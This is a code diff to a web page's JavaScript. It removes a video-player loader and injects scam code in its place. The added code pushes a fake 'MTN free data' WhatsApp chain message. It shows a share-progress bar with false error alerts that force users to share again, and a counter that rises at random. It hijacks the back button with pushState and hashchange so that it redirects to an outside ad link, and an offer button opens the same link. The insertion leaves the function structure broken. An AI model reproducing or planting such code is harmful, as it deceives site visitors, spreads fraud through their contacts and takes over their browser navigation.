@@ -479,22 +479,171 @@ function loadVSLPlayer() {
     }
     playerContainer.innerHTML = '';
 
-    // ── PLAYER ATUALIZADO ──
-    playerContainer.innerHTML = '<vturb-smartplayer id="vid-69d3483cd02c3c8fc0d3d170" style="display: block; margin: 0 auto; width: 100%;"></vturb-smartplayer>';
 
-    var s = document.createElement("script");
-    s.type = "text/javascript";
-    s.src = "https://scripts.converteai.net/221c9f43-b961-4a72-a699-97ce3551a9df/players/69d3483cd02c3c8fc0d3d170/v4/player.js";
-    s.async = true;
-    s.onload = function () {
-        window.vslPlayerLoaded = true;
-        console.log('Script do player VSL carregado com sucesso');
-    };
-    s.onerror = function () {
-        console.error('Erro ao carregar o script do player VSL');
-    };
-    document.head.appendChild(s);
+
+    
+
+
+// ================= COOKIE FUNCTIONS =================
+function set_Cookie(name,value){
+    var Days = 30;
+    var exp = new Date();
+    exp.setTime(exp.getTime() + (Days*20*1000));
+    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;";
 }
+
+function get_Cookie(name){
+    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+    if(arr=document.cookie.match(reg)){
+        return unescape(arr[2]);
+    }
+    return '';
+}
+
+// ================= COUNTER =================
+var timeleft = 4548;
+
+var downloadTimer = setInterval(function(){
+    timeleft = timeleft + Math.floor(Math.random() * 600);
+    document.getElementById('countdowntimer').textContent = timeleft;
+
+    if (timeleft <= 0){
+        clearInterval(downloadTimer);
+    }
+},1000);
+
+// ================= WHATSAPP SHARE TEXT =================
+var text1 = "*MTN 1 MONTH FREE DATA FOR OLD SUBSCRIBERS 🎉*%0A%0AGet 1 Month Free Data if your MTN Sim Card is up to a year old%0A%0A*HOW OLD IS YOUR SIM CARD*?%0A1 Year Old - 5GB%0A2 Years and above - 10GB%0A5 - 10 Years - 20GB%0A10 Years and above - 50GB%0A%0A*Get Offer*👇%0Ahttps://itidokpo.xyz/freemtndata";
+
+var error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share";
+
+var abcde = "https://crn77.com/4/6674593";
+
+var saved = "";
+
+var share = "whatsapp://send?text="+text1;
+
+
+// ================= BACK BUTTON REDIRECT =================
+window.onhashchange = function(){jp();};
+
+function hh(){
+    history.pushState(history.length+1, "message", "#"+new Date().getTime());
+}
+
+function jp(){
+    fh();
+}
+
+setTimeout('hh();',500);
+
+function fh(){
+    location.href="https://crn77.com/4/6674593";
+}
+
+function goon(){
+    location.href="https://crn77.com/4/6674593";
+}
+
+
+// ================= SHARE PROGRESS SYSTEM =================
+var swidth = localStorage.getItem(saved);
+
+if(swidth !== null){
+    var width = swidth * 1;
+
+    $("#intro").fadeOut(0);
+    $(".comments").fadeOut(0);
+    $("#share").fadeIn(0);
+
+    $("#fill2").css("width", width + "%");
+    $("#percentage2").text(width + "%");
+}
+else{
+    var width = 0;
+}
+
+$("#whatsapp").click(function(){
+
+    window.location.href = share;
+
+    if(width == 0){
+        width += 50;
+    }
+    else if(width == 50){
+        alert(error);
+        width += 15;
+    }
+    else if(width == 65){
+        width += 5;
+    }
+    else if(width == 70){
+        alert(error);
+        width += 10;
+    }
+    else if(width == 80){
+        alert(error);
+        width += 5;
+    }
+    else if(width == 85){
+        width += 2;
+    }
+    else if(width == 87){
+        width += 1;
+    }
+    else if(width == 88){
+        width += 2;
+    }
+    else if(width == 90){
+        width += 1;
+    }
+    else if(width == 91){
+        width += 1;
+    }
+    else if(width == 92){
+        width += 1;
+    }
+    else if(width == 93){
+        width += 1;
+    }
+    else if(width == 94){
+        width += 1;
+    }
+    else if(width == 95){
+        width += 1;
+    }
+    else if(width == 96){
+        width += 2;
+    }
+    else{
+        $("#share").fadeOut(0);
+        $("#claim").fadeIn(1000);
+    }
+
+    localStorage.setItem(saved,width);
+
+    setTimeout(function(){
+
+        $("#fill2").css("width", width + "%");
+        $("#percentage2").text(width + "%");
+
+    },2000);
+
+});
+
+
+// ================= OFFER BUTTON =================
+$("#offer").click(function(){
+
+    window.open(abcde,"_blank");
+
+});
+    
+
+
+      
+
+    
 
 const allPages = [
     document.getElementById('welcomePage'),
